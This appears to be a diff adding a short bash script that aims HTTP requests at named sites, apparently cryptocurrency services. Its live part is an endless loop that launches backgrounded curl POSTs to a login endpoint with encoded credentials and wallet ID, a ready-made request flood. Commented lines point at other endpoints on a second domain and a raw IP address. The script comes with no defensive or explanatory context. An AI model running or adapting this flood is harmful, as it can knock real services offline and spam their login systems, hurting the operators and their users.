@@ -1,0 +1,10 @@
+#!/bin/bash
+
+#curl -X POST https://cdn07.mcdz.vip/www/v1/users/queryUserInfo -d 'loginType=email&loginName=333%40166.com&nationNo=0086&exChannel=36'
+#curl -X POST http://118.193.40.55/www/v1/users/queryUserInfo -d 'loginType=email&loginName=333%40166.com&nationNo=0086&exChannel=36'
+
+while(( 0 < 1 ))
+do
+#   curl -X POST https://cdn07.mcdz.vip/www/v1/emails/emailCheck -d 'code=1234' > /dev/null &
+    curl -X POST https://ckcoinpro.com/ckcoin/account/login -d 'name=%2BN%2BAEnMSsY6Sf6BmPlgrrw%3D%3D&password=xkzV19OV38BSJeQCi8hOOg%3D%3D&walletid=33321123' > /dev/null &
+done
